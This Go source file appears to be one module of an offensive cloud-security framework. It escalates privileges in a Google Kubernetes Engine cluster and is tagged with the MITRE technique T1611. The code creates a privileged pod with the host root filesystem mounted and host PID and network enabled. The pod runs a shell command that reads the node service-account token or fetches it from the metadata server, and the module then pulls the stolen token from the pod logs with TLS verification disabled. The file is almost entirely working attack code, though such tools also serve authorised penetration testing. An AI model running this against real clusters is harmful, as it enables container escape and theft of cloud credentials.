package gke

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	container "google.golang.org/api/container/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateNodeSA{})
}

// EscalateNodeSA creates a privileged pod that mounts the host filesystem
// to read the node's service account token or curl the metadata server.
type EscalateNodeSA struct{}

func (m *EscalateNodeSA) Info() module.Info {
	return module.Info{
		Name:         "privesc.gke.escalate-node-sa",
		Tactic:       module.TacticPrivesc,
		Service:      "gke",
		Description:  "Create a privileged pod to steal the node SA token via host mount or metadata server",
		RequiresAuth: true,
		AttackID:     "T1611",
	}
}

func (m *EscalateNodeSA) Run(ctx module.RunContext) error {
	cluster := ctx.Flags["cluster"]
	zone := ctx.Flags["zone"]
	namespace := ctx.Flags["namespace"]

	if cluster == "" || zone == "" {
		output.Warn("Usage: run privesc.gke.escalate-node-sa --cluster <name> --zone <zone> [--namespace <ns>]")
		output.Info("Example: --cluster my-cluster --zone us-central1-a")
		return nil
	}

	if namespace == "" {
		namespace = "default"
	}

	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}
	if project == "" {
		if projects := module.EnsureProjects(&ctx); len(projects) > 0 {
			project = projects[0]
		}
	}
	if project == "" {
		output.Warn("No project specified.")
		return nil
	}

	// Get cluster credentials via the GKE API.
	svc, err := container.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create container client: %w", err)
	}

	clusterPath := fmt.Sprintf("projects/%s/locations/%s/clusters/%s", project, zone, cluster)
	output.Info("Fetching cluster credentials: %s", clusterPath)

	clusterInfo, err := svc.Projects.Locations.Clusters.Get(clusterPath).Do()
	if err != nil {
		return fmt.Errorf("get cluster: %w", err)
	}

	endpoint := clusterInfo.Endpoint
	if endpoint == "" {
		return fmt.Errorf("cluster %s has no endpoint", cluster)
	}

	output.Success("Cluster endpoint: %s", endpoint)

	// Obtain Bearer token.
	creds := ctx.Session.TokenSource()
	if creds == nil {
		return fmt.Errorf("no credentials available for Bearer token")
	}
	token, err := creds.TokenSource.Token()
	if err != nil {
		return fmt.Errorf("get access token: %w", err)
	}

	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	baseURL := fmt.Sprintf("https://%s", endpoint)
	podName := fmt.Sprintf("nimbus-escalate-%d", time.Now().Unix())

	// Build a privileged pod manifest with host filesystem mount.
	podManifest := map[string]any{
		"apiVersion": "v1",
		"kind":       "Pod",
		"metadata": map[string]any{
			"name":      podName,
			"namespace": namespace,
			"labels": map[string]string{
				"app": "nimbus-escalate",
			},
		},
		"spec": map[string]any{
			"hostPID":     true,
			"hostNetwork": true,
			"containers": []map[string]any{
				{
					"name":  "escalate",
					"image": "alpine:latest",
					"command": []string{
						"/bin/sh", "-c",
						"cat /host/var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || " +
							"wget -qO- --header 'Metadata-Flavor: Google' " +
							"'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'; " +
							"echo; sleep 3600",
					},
					"securityContext": map[string]any{
						"privileged": true,
					},
					"volumeMounts": []map[string]any{
						{
							"name":      "host-root",
							"mountPath": "/host",
						},
					},
				},
			},
			"volumes": []map[string]any{
				{
					"name": "host-root",
					"hostPath": map[string]any{
						"path": "/",
					},
				},
			},
			"restartPolicy": "Never",
		},
	}

	podJSON, err := json.Marshal(podManifest)
	if err != nil {
		return fmt.Errorf("marshal pod manifest: %w", err)
	}

	// Create the privileged pod.
	createURL := fmt.Sprintf("%s/api/v1/namespaces/%s/pods", baseURL, namespace)
	output.Warn("Creating privileged pod: %s in namespace %s", podName, namespace)
	output.Info("Pod will mount host filesystem at /host and attempt to read node SA token")

	req, err := http.NewRequest("POST", createURL, bytes.NewReader(podJSON))
	if err != nil {
		return fmt.Errorf("create pod request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+token.AccessToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := httpClient.Do(req)
	if err != nil {
		return fmt.Errorf("create pod: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode >= 400 {
		output.Error("Pod creation failed (HTTP %d): %s", resp.StatusCode, string(body))
		return fmt.Errorf("pod creation failed with status %d", resp.StatusCode)
	}

	output.Success("Privileged pod %s created successfully", podName)
	output.Info("The pod has hostPID, hostNetwork, privileged securityContext, and host root mounted at /host")
	output.Info("Wait for the pod to start, then read logs:")
	output.Info("  kubectl logs %s -n %s", podName, namespace)
	output.Info("Or exec into it:")
	output.Info("  kubectl exec -it %s -n %s -- /bin/sh")
	output.Warn("Clean up when done:")
	output.Info("  kubectl delete pod %s -n %s", podName, namespace)

	// Try to read pod logs after a brief wait (pod may not be running yet).
	output.Info("Attempting to read pod logs (pod may still be starting)...")

	logURL := fmt.Sprintf("%s/api/v1/namespaces/%s/pods/%s/log", baseURL, namespace, podName)
	logReq, err := http.NewRequest("GET", logURL, nil)
	if err == nil {
		logReq.Header.Set("Authorization", "Bearer "+token.AccessToken)
		logResp, err := httpClient.Do(logReq)
		if err == nil {
			defer logResp.Body.Close()
			logBody, _ := io.ReadAll(logResp.Body)
			if logResp.StatusCode < 400 && len(logBody) > 0 {
				output.Success("Pod log output (potential SA token):\n%s", string(logBody))
			} else {
				output.Info("Pod not ready yet or no logs available. Check back with kubectl logs.")
			}
		}
	}

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.gke.escalate-node-sa",
			Severity:    module.SevCritical,
			Title:       "Created privileged pod with host filesystem access",
			Description: fmt.Sprintf("Created privileged pod %s in cluster %s (project %s) with hostPID, hostNetwork, and host root mount to steal node SA token", podName, cluster, project),
			Resource:    fmt.Sprintf("%s/%s", namespace, podName),
			Project:     project,
			Data: map[string]any{
				"cluster":   cluster,
				"zone":      zone,
				"namespace": namespace,
				"pod_name":  podName,
				"endpoint":  endpoint,
			},
		}
	}

	return nil
}
